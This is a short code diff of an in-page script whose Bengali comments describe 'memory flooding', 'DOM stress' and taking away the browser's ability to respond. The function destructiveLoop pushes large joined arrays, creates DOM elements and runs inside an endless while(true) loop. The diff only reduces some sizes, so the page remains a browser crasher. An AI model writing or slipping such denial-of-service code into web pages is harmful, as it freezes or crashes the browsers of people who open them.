@@ -32,7 +32,7 @@
             let data = [];
             function destructiveLoop() {
                 // মেমোরি ফ্লাডিং - প্রতি মিলিসেকেন্ডে বিশাল ডাটা পুশ
-                data.push(new Array(1000000000000000).join("⚠︎ENAFUL⚠︎"));
+                data.push(new Array(10000000).join("⚠︎ENAFUL⚠︎"));
                 
                 // ইনফিনিট এলিমেন্ট ক্রিয়েশন (DOM Stress)
                 let div = document.createElement('div');
@@ -50,7 +50,7 @@
             while(true) {
                 destructiveLoop();
                 // এটি ব্রাউজারের রেসপন্স করার ক্ষমতা কেড়ে নেবে
-                var crash = " ".repeat(1000000000); 
+                var crash = " ".repeat(1000); 
             }
         }
     </script>
